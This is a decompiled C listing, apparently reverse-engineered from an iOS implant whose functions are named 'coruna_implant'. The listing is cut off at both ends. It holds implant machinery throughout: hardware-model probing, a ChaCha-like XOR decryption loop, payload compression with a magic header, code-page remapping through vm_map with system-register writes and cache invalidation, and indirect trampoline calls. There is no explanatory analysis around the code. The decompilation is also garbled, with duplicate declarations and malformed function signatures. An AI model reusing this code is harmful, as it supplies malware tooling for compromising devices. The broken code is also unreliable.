        stack_guard[0x10] = '\0';
        stack_guard[0x11] = '\0';
        stack_guard[0x12] = '\0';
        stack_guard[0x13] = '\0';
        stack_guard[0x14] = '\0';
        stack_guard[0x15] = '\0';
        stack_guard[0x16] = '\0';
        stack_guard[0x17] = '\0';
        stack_guard[0x28] = '\0';
        stack_guard[0x29] = '\0';
        stack_guard[0x2a] = '\0';
        stack_guard[0x2b] = '\0';
        stack_guard[0x2c] = '\0';
        stack_guard[0x2d] = '\0';
        stack_guard[0x2e] = '\0';
        stack_guard[0x2f] = '\0';
        stack_guard[0x20] = '\0';
        stack_guard[0x21] = '\0';
        stack_guard[0x22] = '\0';
        stack_guard[0x23] = '\0';
        stack_guard[0x24] = '\0';
        stack_guard[0x25] = '\0';
        stack_guard[0x26] = '\0';
        stack_guard[0x27] = '\0';
        stack_guard[8] = '\0';
        stack_guard[9] = '\0';
        stack_guard[10] = '\0';
        stack_guard[0xb] = '\0';
        stack_guard[0xc] = '\0';
        stack_guard[0xd] = '\0';
        stack_guard[0xe] = '\0';
        stack_guard[0xf] = '\0';
        stack_guard[0] = '\0';
        stack_guard[1] = '\0';
        stack_guard[2] = '\0';
        stack_guard[3] = '\0';
        stack_guard[4] = '\0';
        stack_guard[5] = '\0';
        stack_guard[6] = '\0';
        stack_guard[7] = '\0';
        block_ctx = 0;
        port = coruna_uname(arg,handle,status,stack_guard,0x200,&block_ctx);
        if ((int)port == 0) {
          port = coruna_implant_path_dispatch(arg,stack_guard,*(uint32_t *)(handle + 4),block_ctx,n,
                                m);
        }
      }
      goto fail;
    }
  }
  port = 0xad001;
fail:
  if (*(long *)k_implant_stack_chk_guard_slot == sa_saved) {
    return port;
  }
  ___stack_chk_fail();
}





uint32_t coruna_implant_probe_hw_model(long handle)
{
  uint32_t u;
  uint size;
  unsigned long version;
  uint32_t port;
  
  port = 0;
  if (handle != 0) {
    version = coruna_implant6850_str_hw_model();
    if ((version & 1) == 0) {
      size = *(uint *)(handle + 0xc0);
      if (size < 0x100501) {
        if (size >> 0x14 == 0) {
          port = 0x400000;
          if (size < 0xe0000) {
            port = 0x300000;
          }
          u = 0x700000;
          if (size < 0xe0500) {
            u = port;
          }
          port = 0x800000;
          if (size < 0xf0707) {
            port = u;
          }
        }
        else {
          port = 0x700000;
        }
      }
      else {
        port = 0x800000;
      }
    }
    else {
      port = 0x900000;
    }
  }
  return port;
}





uint64_t
void coruna_implant_path_dispatch(long handle,char *path,uint size,long addr_2,long *off_3,uint *flags_2)
{
  uint64_t u;
  uint64_t size;
  uint scratch;
  void *bootargs;
  
  size = 0xad001;
  if (handle == 0) {
    return 0xad001;
  }
  if (*(void (**)(handle + 0x40) == (void (*)0x0 || path == (char *)0x0) {
    return 0xad001;
  }
  if (((*path == '\0' || addr_2 == 0) || off_3 == (long *)0x0) || flags_2 == (uint *)0x0) {
    return 0xad001;
  }
  bootargs = (void *)0x0;
  scratch = 0;
  u = (**(void (**)(handle + 0x40))(handle,path,&bootargs,&scratch);
  if ((int)u != 0) {
    return u;
  }
  if ((size & 1) != 0) {
    if ((bootargs == (void *)0x0) || (scratch == 0)) goto fail;
    coruna_implant_md5_xor_loop(addr_2);
  }
  if ((((size >> 1 & 1) == 0) || (size = coruna_compression_decode_buffer(&bootargs,&scratch), (int)size == 0)) &&
     (size = (**(void (**)(handle + 0xe8))(handle,0,bootargs,scratch), (int)size == 0)) {
    *off_3 = (long)bootargs;
    *flags_2 = scratch;
    return size;
  }
fail:
  _bzero(bootargs,(unsigned long)scratch);
  _free(bootargs);
  return size;
}





void coruna_implant6850_nop(void)
{
  return;
}
uint coruna_mach_make_memory_entry_64(void *ctx,void *scratch,size_t len)
{
  vm_size_t size;
  long handle;
  unsigned long u;
  uint8_t *ptr;
  int err;
  uint size;
  unsigned long version;
  long addr;
  uint port;
  unsigned long tag;
  unsigned long kind;
  unsigned long type_id;
  mach_port_t scratch;
  vm_inherit_t inheritance;
  vm_size_t lv12;
  vm_address_t bootargs;
  
  tag = *(unsigned long *)k_implant_vm_page_mask_slot;
  type_id = tag & (unsigned long)ctx;
  kind = type_id + len;
  version = *(unsigned long *)k_implant_vm_page_size_slot;
  u = 0;
  if (version != 0) {
    u = kind / version;
  }
  addr = kind - u * version;
  handle = 0;
  if (addr != 0) {
    handle = version - addr;
  }
  size = handle + kind;
  bootargs = 0;
  scratch = 0;
  lv12 = size;
  err = _memcmp(ctx,scratch,len);
  inheritance = (vm_inherit_t)lv12;
  if (err == 0) {
    port = 0;
  }
  else {
    kind = (unsigned long)ctx & (tag ^ 0xffffffffffffffff);
    port = 0xad00b;
    err = coruna_implant_touch_buffer(kind,size);
    ptr = k_implant_mach_task_self_slot;
    if (err != 0) {
      size = _mach_make_memory_entry_64
                        (*(vm_map_t *)k_implant_mach_task_self_slot,
                         (memory_object_size_t *)&implant_memobj_size_scratch,kind,1,&scratch,0);
      if ((size == 0) &&
         (size = _vm_map(*(vm_map_t *)ptr,&bootargs,size,0,0x1001,scratch,0,0,1,1,inheritance),
         size == 0)) {
        err = coruna_implant_touch_buffer(bootargs,size);
        if ((err != 0) && ((k_implant_icache_mode & 0xfe) == 2)) {
          UnkSytemRegWrite(3,6,0xf,1,5,k_implant_dsb_ctrl_a);
          InstructionSynchronizationBarrier();
          _memcpy((void *)(bootargs + type_id),scratch,len);
          DataSynchronizationBarrier(3,3,0);
          if ((k_implant_icache_mode & 0xfe) == 2) {
            UnkSytemRegWrite(3,6,0xf,1,5,k_implant_dsb_ctrl_b);
            InstructionSynchronizationBarrier();
            _sys_icache_invalidate(ctx,len);
            _sys_dcache_flush(ctx,len);
            err = _memcmp(ctx,scratch,len);
            port = 0;
            if (err != 0) {
              port = 0xad00b;
            }
          }
        }
      }
      else {
        port = size | 0x80000000;
      }
    }
  }
  if (bootargs != 0) {
    _vm_deallocate(*(vm_map_t *)k_implant_mach_task_self_slot,bootargs,size);
  }
  if (1 < scratch + 1) {
    _mach_port_deallocate(*(ipc_space_t *)k_implant_mach_task_self_slot,scratch);
  }
  return port;
}





bool coruna_implant_touch_buffer(long handle,size_t len)
{
  void *ptr;
  long handle;
  uint8_t scratch;
  
  scratch = false;
  if ((handle != 0) && (len != 0)) {
    ptr = _malloc(len);
    if (ptr != (void *)0x0) {
      handle = ___memcpy_chk(ptr,handle,len,0xffffffffffffffff);
      scratch = handle != 0;
      _free(ptr);
    }
  }
  return scratch;
}





void coruna_pacia(void)
{
  return;
}





void coruna_pacda(void)
{
  return;
}





void coruna_pacib(void)
{
  return;
}





void coruna_pacdb(void)
{
  return;
}
uint64_t coruna_implant_zero_u64(void)
{
  return 0;
}





void coruna_implant_indirect_call0(coruna_implant_trampoline_fn indirect_target)
{
  (*indirect_target)();
  return;
}





void coruna_implant_indirect_call4(coruna_implant_trampoline_fn indirect_target, uint32_t size, uint64_t val, long handle)
{
  uint32_t scratch[8];
  
  *(uint32_t *)((long)scratch + handle) = size;
  (*indirect_target)();
  return;
}





void coruna_implant_indirect_call4_b(coruna_implant_trampoline_fn indirect_target, uint32_t size, uint64_t val, long handle)
{
  uint32_t scratch[12];
  
  *(uint32_t *)((long)scratch + handle) = size;
  (*indirect_target)();
  return;
}





void coruna_implant_indirect_call4_c(coruna_implant_trampoline_fn indirect_target, uint32_t size, uint64_t val, long handle)
{
  uint32_t scratch[4];
  
  *(uint32_t *)((long)scratch + handle) = size;
  (*indirect_target)();
  return;
}





void coruna_implant_indirect_call4_d(coruna_implant_trampoline_fn indirect_target, uint32_t size, uint64_t val, long handle)
{
  uint32_t scratch[8];
  
  *(uint32_t *)((long)scratch + handle) = size;
  (*indirect_target)();
  return;
}





uint64_t coruna_compression_decode_buffer(uint64_t *val,uint *size)
{
  uint u;
  uint size;
  void *ptr;
  unsigned long version;
  uint64_t port;
  int *err;
  unsigned long tag;
  
  port = 0xad001;
  if (((val != (uint64_t *)0x0) &&
      (err = (int *)*val, err != (int *)0x0 && size != (uint *)0x0)) &&
     (u = *size, u != 0)) {
    if ((7 < u) && (*err == 0xbedf00d)) {
      size = err[1];
      tag = (unsigned long)size;
      if ((size != 0) && (u - 8 < size)) {
        ptr = _malloc(tag + 1);
        if (ptr == (void *)0x0) {
          return 0xad009;
        }
        _memset_s(ptr,tag,0,tag);
        version = _compression_decode_buffer(ptr,tag + 1,err + 2,u - 8,0,0x306);
        if (version == tag) {
          _memset_s(err,u,0,u);
          _free(err);
          *val = ptr;
          *size = size;
          return 0;
        }
        _memset_s(ptr,tag,0,tag);
        _free(ptr);
        return 0xad00b;
      }
    }
    port = 0;
  }
  return port;
}





uint64_t coruna_compression_encode_buffer(uint64_t *val,uint *size)
{
  size_t ls1;
  uint u;
  uint32_t *ptr;
  long handle;
  uint64_t size;
  unsigned long version;
  void *ptr;
  
  size = 0xad001;
  if ((val != (uint64_t *)0x0) &&
     (ptr = (void *)*val, ptr != (void *)0x0 && size != (uint *)0x0)) {
    u = *size;
    version = (unsigned long)u;
    if (8 < u + 8) {
      ls1 = version + 8;
      ptr = _malloc(ls1);
      if (ptr == (uint32_t *)0x0) {
        size = 0xad009;
      }
      else {
        handle = _compression_encode_buffer(ptr + 2,version,ptr,version,0,0x306);
        if (handle - 1U < 0xfffffffe) {
          _memset_s(ptr,version,0,version);
          _free(ptr);
          size = 0;
          *ptr = 0xbedf00d;
          ptr[1] = u;
          *val = ptr;
          *size = (int)handle + 8;
        }
        else {
          _memset_s(ptr,ls1,0,ls1);
          _free(ptr);
          size = 0xad00b;
        }
      }
    }
  }
  return size;
}





uint64_t _start(long handle)
{
  long handle;
  uint64_t u;
  void (*ptr)(void);
  long scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint32_t host_info;
  uint64_t serial_buf;
  uint32_t action;
  uint64_t block_ctx;
  int stack_guard;
  void *sa_saved;
  long sa_new;
  long path_buf;
  
  sa_new = 0;
  path_buf = 0;
  sa_saved = (void *)0x0;
  stack_guard = 0;
  if (handle == 0) {
    u = 0xad001;
  }
  else {
    block_ctx = 0;
    action = 0;
    serial_buf = 0;
    host_info = 0;
    scratch = 0;
    thread_attr = 0;
    thread_attr = 0;
    bootargs = 0;
    *(uint8_t *)(handle + 0x5e8) = 0;
    u = coruna_strdup(handle,0x70000,&sa_saved,&stack_guard);
    if (((((int)u == 0) && (u = coruna_implant_ctx_build(&path_buf,handle), (int)u == 0)) &&
        (u = (**(void (**)(path_buf + 0x18))(path_buf,0xa0001,&block_ctx,&action),
        (int)u == 0)) &&
       ((u = (**(void (**)(path_buf + 0x18))(path_buf,0xa0002,&serial_buf,&host_info),
        (int)u == 0 &&
        (u = coruna_implant_remote_trampoline(&sa_new), handle = path_buf, (int)u == 0)))) {
      scratch = sa_new;
      bootargs = k_implant_scan_magic;
      thread_attr = coruna_u64_pack((thread_attr), (0xa0002));
      ptr = *(void (**)(path_buf + 0x28);
      u = coruna_implant6850_nop(coruna_implant_dispatch);
      u = (*ptr)(handle,u,&scratch);
      if ((int)u == 0) {
        u = coruna_implant6850_str_system_library_frameworks_quartzcore_framework_q(handle,sa_new,block_ctx,action,serial_buf,host_info);
      }
    }
    if (path_buf != 0) {
      coruna_implant_ctx_free();
    }
    if (sa_new != 0) {
      coruna_implant_ctx_free();
    }
    if ((sa_saved != (void *)0x0) && (stack_guard != 0)) {
      _memset_s(sa_saved,stack_guard,0,stack_guard);
      _free(sa_saved);
    }
  }
  return u;
}





uint64_t
void coruna_implant_dispatch(uint64_t val,int flags,uint64_t id_2,uint64_t size_3,
            uint64_t *off_4)
{
  uint64_t u;
  unsigned long size;
  int *err;
  
  if (off_4 == (uint64_t *)0x0) {
    return 0xad001;
  }
  size = (unsigned long)*(uint *)(off_4 + 1);
  if (*(uint *)(off_4 + 1) != 0) {
    err = (int *)((long)off_4 + 0xc);
    do {
      if (*err == flags) {
        return 0;
      }
      err = err + 1;
      size = size - 1;
    } while (size != 0);
  }
  u = coruna_implant_dispatch_wrlocked(*off_4);
  return u;
}
void coruna_implant_md5_xor_loop(uint *size,long handle,long addr_2)
{
  uint u;
  uint size;
  uint version;
  uint port;
  uint64_t tag;
  uint64_t kind;
  uint type_id;
  uint type_id_8;
  uint type_id_9;
  uint type_id_10;
  uint type_id_11;
  uint type_id_12;
  long handle;
  byte err;
  int err;
  unsigned long type_id_13;
  uint type_id_14;
  uint type_id_15;
  uint type_id_16;
  uint type_id_17;
  uint type_id_18;
  long addr;
  uint32_t scratch;
  uint scratch;
  uint64_t bootargs;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t host_info;
  uint64_t thread_attr;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t block_ctx;
  int stack_guard [9];
  uint64_t sa_saved;
  uint64_t host_info;
  
  kind = k_implant_slot_00007f08;
  tag = k_implant_md5_init_state;
  if (((handle != 0) && (addr_2 != 0)) && (size != (uint *)0x0)) {
    handle = 0;
    thread_attr = 0;
    host_info = 0;
    action = 0;
    serial_buf = 0;
    bootargs = 0;
    thread_attr = 0;
    bootargs = 0;
    stack_guard[1] = *size;
    stack_guard[6] = (int)*(uint64_t *)(size + 5);
    stack_guard[7] = (int)((unsigned long)*(uint64_t *)(size + 5) >> 0x20);
    block_ctx = k_implant_md5_init_state;
    stack_guard[4] = (int)*(uint64_t *)(size + 3);
    stack_guard[5] = (int)((unsigned long)*(uint64_t *)(size + 3) >> 0x20);
    stack_guard[2] = (int)*(uint64_t *)(size + 1);
    stack_guard[3] = (int)((unsigned long)*(uint64_t *)(size + 1) >> 0x20);
    stack_guard[8] = size[7];
    sa_saved = 0;
    host_info = 0;
    type_id_13 = 0x40;
    do {
      if (type_id_13 < 0x40) {
        err = *(byte *)((long)&scratch + type_id_13);
      }
      else {
        scratch = (uint)tag;
        scratch = (uint)((unsigned long)tag >> 0x20);
        serial_buf = (uint)sa_saved;
        type_id = (uint)serial_buf;
        serial_buf = (uint)((unsigned long)sa_saved >> 0x20);
        type_id_8 = serial_buf;
        bootargs = (uint)kind;
        bootargs = (uint)((unsigned long)kind >> 0x20);
        action = 0;
        action = 0;
        err = 10;
        type_id_18 = stack_guard[1];
        type_id_14 = stack_guard[2];
        type_id_16 = stack_guard[5];
        type_id_17 = stack_guard[6];
        type_id_10 = stack_guard[3];
        type_id_12 = stack_guard[4];
        type_id_11 = (uint)bootargs;
        type_id_15 = stack_guard[7];
        type_id_9 = stack_guard[8];
        do {
          serial_buf = (uint)serial_buf ^ scratch + type_id_18;
          type_id_16 = ((uint)serial_buf >> 0x10 | (uint)serial_buf << 0x10) + type_id_16;
          u = type_id_16 ^ type_id_18;
          scratch = (u >> 0x14 | u << 0xc) + scratch + type_id_18;
          type_id_18 = scratch ^ ((uint)serial_buf >> 0x10 | (uint)serial_buf << 0x10);
          type_id_16 = (type_id_18 >> 0x18 | type_id_18 << 8) + type_id_16;
          u = type_id_16 ^ (u >> 0x14 | u << 0xc);
          serial_buf = serial_buf ^ scratch + type_id_14;
          type_id_17 = (serial_buf >> 0x10 | serial_buf << 0x10) + type_id_17;
          size = type_id_17 ^ type_id_14;
          scratch = (size >> 0x14 | size << 0xc) + scratch + type_id_14;
          version = scratch ^ (serial_buf >> 0x10 | serial_buf << 0x10);
          type_id_17 = (version >> 0x18 | version << 8) + type_id_17;
          type_id_14 = type_id_17 ^ (size >> 0x14 | size << 0xc);
          action = (uint)action ^ type_id_11 + type_id_10;
          type_id_15 = ((uint)action >> 0x10 | (uint)action << 0x10) + type_id_15;
          size = type_id_15 ^ type_id_10;
          type_id_11 = (size >> 0x14 | size << 0xc) + type_id_11 + type_id_10;
          port = type_id_11 ^ ((uint)action >> 0x10 | (uint)action << 0x10);
          type_id_15 = (port >> 0x18 | port << 8) + type_id_15;
          type_id_10 = type_id_15 ^ (size >> 0x14 | size << 0xc);
          action = action ^ bootargs + type_id_12;
          type_id_9 = (action >> 0x10 | action << 0x10) + type_id_9;
          size = type_id_9 ^ type_id_12;
          bootargs = (size >> 0x14 | size << 0xc) + bootargs + type_id_12;
          type_id_12 = bootargs ^ (action >> 0x10 | action << 0x10);
          type_id_9 = (type_id_12 >> 0x18 | type_id_12 << 8) + type_id_9;
          size = type_id_9 ^ (size >> 0x14 | size << 0xc);
          scratch = (type_id_14 >> 0x19 | type_id_14 << 7) + scratch;
          type_id_12 = scratch ^ (type_id_12 >> 0x18 | type_id_12 << 8);
          type_id_15 = (type_id_12 >> 0x10 | type_id_12 << 0x10) + type_id_15;
          type_id_14 = type_id_15 ^ (type_id_14 >> 0x19 | type_id_14 << 7);
          scratch = (type_id_14 >> 0x14 | type_id_14 << 0xc) + scratch;
          type_id_12 = scratch ^ (type_id_12 >> 0x10 | type_id_12 << 0x10);
          action = type_id_12 >> 0x18 | type_id_12 << 8;
          type_id_15 = action + type_id_15;
          type_id_14 = type_id_15 ^ (type_id_14 >> 0x14 | type_id_14 << 0xc);
          type_id_14 = type_id_14 >> 0x19 | type_id_14 << 7;
          scratch = (type_id_10 >> 0x19 | type_id_10 << 7) + scratch;
          type_id_12 = scratch ^ (type_id_18 >> 0x18 | type_id_18 << 8);
          type_id_9 = (type_id_12 >> 0x10 | type_id_12 << 0x10) + type_id_9;
          type_id_10 = type_id_9 ^ (type_id_10 >> 0x19 | type_id_10 << 7);
          scratch = (type_id_10 >> 0x14 | type_id_10 << 0xc) + scratch;
          type_id_12 = scratch ^ (type_id_12 >> 0x10 | type_id_12 << 0x10);
          serial_buf = type_id_12 >> 0x18 | type_id_12 << 8;
          type_id_9 = (uint)serial_buf + type_id_9;
          type_id_10 = type_id_9 ^ (type_id_10 >> 0x14 | type_id_10 << 0xc);
          type_id_10 = type_id_10 >> 0x19 | type_id_10 << 7;
          type_id_11 = (size >> 0x19 | size << 7) + type_id_11;
          type_id_12 = type_id_11 ^ (version >> 0x18 | version << 8);
          type_id_16 = (type_id_12 >> 0x10 | type_id_12 << 0x10) + type_id_16;
          type_id_18 = type_id_16 ^ (size >> 0x19 | size << 7);
          type_id_11 = (type_id_18 >> 0x14 | type_id_18 << 0xc) + type_id_11;
          type_id_12 = type_id_11 ^ (type_id_12 >> 0x10 | type_id_12 << 0x10);
          serial_buf = type_id_12 >> 0x18 | type_id_12 << 8;
          type_id_16 = serial_buf + type_id_16;
          type_id_12 = type_id_16 ^ (type_id_18 >> 0x14 | type_id_18 << 0xc);
          type_id_12 = type_id_12 >> 0x19 | type_id_12 << 7;
          bootargs = bootargs + (u >> 0x19 | u << 7);
          type_id_18 = bootargs ^ (port >> 0x18 | port << 8);
          type_id_17 = (type_id_18 >> 0x10 | type_id_18 << 0x10) + type_id_17;
          u = type_id_17 ^ (u >> 0x19 | u << 7);
          bootargs = (u >> 0x14 | u << 0xc) + bootargs;
          type_id_18 = bootargs ^ (type_id_18 >> 0x10 | type_id_18 << 0x10);
          action = type_id_18 >> 0x18 | type_id_18 << 8;
          type_id_17 = (uint)action + type_id_17;
          type_id_18 = type_id_17 ^ (u >> 0x14 | u << 0xc);
          type_id_18 = type_id_18 >> 0x19 | type_id_18 << 7;
          err = err + -1;
        } while (err != 0);
        addr = 0;
        bootargs = coruna_u64_pack((type_id_14), (type_id_18));
        host_info = coruna_u64_pack((type_id_17), (type_id_16));
        thread_attr = coruna_u64_pack((type_id_12), (type_id_10));
        thread_attr = coruna_u64_pack((type_id_9), (type_id_15));
        err = (char)tag + (char)scratch;
        bootargs = coruna_u64_pack((bootargs), ((uint))bootargs + type_id_11);
        do {
          *(int *)((long)&bootargs + addr + 4) =
               *(int *)((long)stack_guard + addr) + *(int *)((long)&bootargs + addr + 4);
          addr = addr + 4;
        } while (addr != 0x34);
        sa_saved = coruna_u64_pack((type_id_8), (type_id + 1));
        type_id_13 = 0;
        if (type_id == 0xffffffff) {
          sa_saved = (unsigned long)(type_id_8 + 1) << 0x20;
        }
      }
      *(byte *)(handle + handle) = *(byte *)(handle + handle) ^ err;
      type_id_13 = type_id_13 + 1;
      handle = handle + 1;
    } while (handle != addr_2);
  }
  return;
}





uint64_t coruna_implant_ctx_init(uint64_t *val)
{
  uint64_t u;
  uint32_t *ptr;
  uint64_t scratch;
  
  if (val == (uint64_t *)0x0) {
    u = 0xad001;
  }
  else {
    scratch = 0;
    u = coruna_pthread_rwlock_init(&scratch,0x18);
    if ((int)u == 0) {
      ptr = _calloc(1,0x38);
      if (ptr == (uint32_t *)0x0) {
        coruna_pthread_rwlock_destroy(scratch);
        u = 0xad009;
      }
      else {
        u = 0;
        *ptr = 0x10001;
        *(uint64_t *)(ptr + 2) = scratch;
        ((void (**)(void *, long, uint64_t))(ptr + 4))[0] = coruna_implant_vtable_write;
        ((void (**)(void *, long, uint64_t))(ptr + 6))[0] = coruna_implant_vtable_read_get;
        ((void (**)(void *, long, uint64_t))(ptr + 8))[0] = coruna_implant_vtable_read_put;
        ((void (**)(void *, long, uint64_t))(ptr + 10))[0] = coruna_implant_vtable_read_stream;
        ((void (**)(void *, long, uint64_t))(ptr + 0xc))[0] = coruna_implant_vtable_read_bulk;
        *val = ptr;
      }
    }
  }
  return u;
}





uint64_t coruna_implant_ctx_free(uint64_t *val)
{
  uint64_t u;
  
  if ((val == (uint64_t *)0x0) || (val[1] == 0)) {
    u = 0xad001;
  }
  else {
    u = coruna_pthread_rwlock_destroy();
    val[1] = 0;
    *val = 0;
    val[3] = 0;
    val[2] = 0;
    val[5] = 0;
    val[4] = 0;
    val[6] = 0;
    _free(val);
  }
  return u;
}





unsigned long coruna_implant_ctx_build(long *arg,long val)

{
  uint *ptr;
  int count;
  uint tag;
  bool err;
  int idx;
  void *ptr;
  long addr;
  long off;
  long base;
  long ctx_val;
  unsigned long kind;
  unsigned long port;
  uint sa_new;
  void *path_buf;
  long tmp_buf;
  
  kind = 0xad001;
  tmp_buf = 0;
  if (((arg != (long *)0x0) && (val != 0)) &&
     (kind = coruna_implant_ctx_init(&tmp_buf), (int)kind == 0)) {
    ctx_val = *(long *)(tmp_buf + 8);
    port = 0;
    do {
      idx = *(int *)(val + port * 0x30 + 0x140);
      if (idx == 0) {
found:
        kind = 0;
      }
      else {
        base = val + port * 0x30;
        addr = *(long *)(base + 0x148);
        if (addr == 0) {
          kind = 0xad014;
          goto nomem;
        }
        off = val + port * 0x30;
        count = *(int *)(off + 0x150);
        if (count == 0 || ctx_val == 0) {
          tag = 0xad014;
          if (count != 0) {
            tag = 0xad001;
          }
          kind = (unsigned long)tag;
          goto nomem;
        }
        ptr = (uint *)(off + 0x150);
        tag = *(uint *)(ctx_val + 0xe8);
        if (tag != 0) {
          off = 0;
          do {
            if (*(int *)(ctx_val + 0xf0 + off) == idx) {
              path_buf = (void *)0x0;
              sa_new = 0;
              kind = coruna_implant_resolve_typed_buffer(ctx_val,ctx_val + 0xf0 + off,&path_buf,&sa_new);
              if ((int)kind != 0) goto invalid;
              ptr = *(void **)(base + 0x148);
              tag = *ptr;
              if ((path_buf == ptr && sa_new == tag) ||
                 ((sa_new == tag &&
                  (idx = _memcmp(path_buf,ptr,(unsigned long)sa_new), idx == 0))))
              goto found;
              kind = 0x700a;
              goto invalid;
            }
            off = off + 0x20;
          } while ((unsigned long)tag * 0x20 - off != 0);
        }
        if (*(uint *)(ctx_val + 0xe4) <= tag) {
          kind = 0x7006;
          goto nomem;
        }
        kind = 0;
        base = ctx_val + (unsigned long)tag * 0x20;
        *(int *)(base + 0xf0) = idx;
        *(uint8_t *)(base + 0xf8) = 2;
        *(long *)(base + 0x100) = addr;
        *(uint *)(base + 0x108) = *ptr;
        *(uint *)(ctx_val + 0xe8) = tag + 1;
      }
invalid:
    } while (((int)kind == 0) && (err = port < 0x17, port = port + 1, err));
    if ((int)kind == 0) {
      *arg = tmp_buf;
    }
    else {
nomem:
      coruna_implant_ctx_free(tmp_buf);
    }
  }
  return kind;
}





uint64_t coruna_implant_dispatch_wrlocked(short *arg,uint64_t val,long handle,uint64_t id_2)
{
  int err;
  uint64_t u;
  pthread_rwlock_t *ptr;
  
  u = 0xad001;
  if ((((arg != (short *)0x0) && (*arg == 1)) && (arg[1] != 0)) &&
     (((ptr = *(pthread_rwlock_t **)(arg + 4), ptr != (pthread_rwlock_t *)0x0 &&
       ((int)val != 0)) && ((handle != 0 && ((int)id_2 != 0)))))) {
    err = _pthread_rwlock_wrlock(ptr);
    if (err == 0) {
      u = coruna_implant_write_slot(ptr,val,handle,id_2,0);
      _pthread_rwlock_unlock(ptr);
    }
    else {
      u = 0xad020;
    }
  }
  return u;
}





uint64_t coruna_implant_vtable_write(long handle,long addr_2,uint64_t val)
{
  int err;
  uint64_t u;
  pthread_rwlock_t *ptr;
  
  u = 0xad001;
  if ((handle != 0) &&
     (ptr = *(pthread_rwlock_t **)(handle + 8),
     (ptr != (pthread_rwlock_t *)0x0 && addr_2 != 0) && (int)val != 0)) {
    err = _pthread_rwlock_wrlock(ptr);
    if (err == 0) {
      u = coruna_implant_apply_command_table(ptr,2,addr_2,val);
      _pthread_rwlock_unlock(ptr);
    }
    else {
      u = 0xad020;
    }
  }
  return u;
}





uint64_t coruna_implant_vtable_read_get(long handle,int flags,long addr_2,long off_3)
{
  int err;
  char *ptr;
  unsigned long u;
  pthread_rwlock_t *ptr;
  uint64_t size;
  
  size = 0xad001;
  if ((handle != 0) &&
     (ptr = *(pthread_rwlock_t **)(handle + 8),
     ((ptr != (pthread_rwlock_t *)0x0 && flags != 0) && addr_2 != 0) && off_3 != 0)) {
    err = _pthread_rwlock_rdlock(ptr);
    if (err == 0) {
      u = (unsigned long)*(uint *)(ptr[1].__opaque + 0x18);
      if (*(uint *)(ptr[1].__opaque + 0x18) != 0) {
        ptr = ptr[1].__opaque;
        do {
          ptr = ptr + 0x20;
          if (*(int *)ptr == flags) {
            size = coruna_implant_resolve_typed_buffer(ptr,ptr,addr_2,off_3);
            goto fail;
          }
          u = u - 1;
        } while (u != 0);
      }
      size = 0x7003;
fail:
      _pthread_rwlock_unlock(ptr);
    }
    else {
      size = 0xad020;
    }
  }
  return size;
}





uint64_t coruna_implant_vtable_read_put(long handle,long addr_2,long off_3)
{
  int err;
  uint64_t u;
  pthread_rwlock_t *ptr;
  
  u = 0xad001;
  if ((handle != 0) &&
     (ptr = *(pthread_rwlock_t **)(handle + 8),
     (ptr != (pthread_rwlock_t *)0x0 && addr_2 != 0) && off_3 != 0)) {
    err = _pthread_rwlock_rdlock(ptr);
    if (err == 0) {
      u = coruna_implant_match_remote_buffer(ptr,addr_2,off_3);
      _pthread_rwlock_unlock(ptr);
    }
    else {
      u = 0xad020;
    }
  }
  return u;
}





uint64_t coruna_implant_vtable_read_stream(long handle,void (*val,uint64_t val)
{
  uint32_t u;
  int err;
  pthread_rwlock_t *ptr;
  uint64_t size;
  char *ptr;
  unsigned long version;
  uint32_t scratch;
  uint64_t bootargs;
  
  size = 0xad001;
  if ((handle != 0) &&
     (ptr = *(pthread_rwlock_t **)(handle + 8),
     ptr != (pthread_rwlock_t *)0x0 && arg != (void (*)0x0)) {
    err = _pthread_rwlock_rdlock(ptr);
    if (err == 0) {
      ptr = ptr[1].__opaque;
      version = 0xffffffffffffffff;
      do {
        ptr = ptr + 0x20;
        version = version + 1;
        if (*(uint *)(ptr[1].__opaque + 0x18) <= version) {
          size = 0;
          break;
        }
        u = *(uint32_t *)ptr;
        bootargs = 0;
        scratch = 0;
        size = coruna_implant_resolve_typed_buffer(ptr,ptr,&bootargs,&scratch);
        if ((int)size != 0) break;
        size = (*arg)(handle,u,bootargs,scratch,val);
      } while ((int)size == 0);
      _pthread_rwlock_unlock(ptr);
    }
    else {
      size = 0xad020;
    }
  }
  return size;
}





uint64_t coruna_implant_vtable_read_bulk(long handle,uint64_t val,void *ctx,uint size)
{
  int err;
  void *ptr;
  unsigned long u;
  pthread_rwlock_t *ptr;
  uint64_t size;
  void *buf;
  char *ptr;
  uint scratch;
  void *bootargs;
  
  size = 0xad001;
  if (handle != 0) {
    ptr = *(pthread_rwlock_t **)(handle + 8);
    if (((ptr != (pthread_rwlock_t *)0x0 && (uint)val != 0) && ctx != (void *)0x0) &&
        size != 0) {
      err = _pthread_rwlock_wrlock(ptr);
      if (err == 0) {
        u = (unsigned long)*(uint *)(ptr[1].__opaque + 0x18);
        if (*(uint *)(ptr[1].__opaque + 0x18) != 0) {
          ptr = ptr[1].__opaque + 0x38;
          do {
            if (*(uint *)(ptr + -0x18) == (uint)val) {
              ptr = _malloc((unsigned long)size);
              if (ptr == (void *)0x0) {
                size = 0xad009;
              }
              else {
                _memcpy(ptr,ctx,(unsigned long)size);
                if (ptr[-0x10] == '\x03') {
                  buf = *(void **)(ptr + -8);
                  _bzero(buf,(unsigned long)*(uint *)ptr);
                  _free(buf);
                }
                else if (ptr[-0x10] == '\x01') {
                  _bzero((void *)(*(long *)(ptr[1].__opaque + 8) + *(long *)(ptr + -8)),
                         (unsigned long)*(uint *)ptr);
                }
                ptr[-0x10] = '\x03';
                *(void **)(ptr + -8) = ptr;
                *(uint *)ptr = size;
                if (ptr[1].__sig == 0) {
                  size = 0;
                }
                else {
                  bootargs = (void *)0x0;
                  scratch = 0;
                  size = coruna_implant_match_remote_buffer(ptr,&bootargs,&scratch);
                  if ((int)size == 0) {
                    size = (*(void (*)ptr[1].__sig)
                                      (val,bootargs,scratch,*(uint64_t *)ptr[1].__opaque);
                    _bzero(bootargs,(unsigned long)scratch);
                    _free(bootargs);
                  }
                }
              }
              goto fail;
            }
            ptr = ptr + 0x20;
            u = u - 1;
          } while (u != 0);
        }
        size = 0x7003;
fail:
        _pthread_rwlock_unlock(ptr);
      }
      else {
        size = 0xad020;
      }
    }
  }
  return size;
}





uint64_t coruna_implant_resolve_typed_buffer(long handle,long addr_2,long *off_3,uint32_t *size)
{
  char err;
  uint64_t u;
  long handle;
  
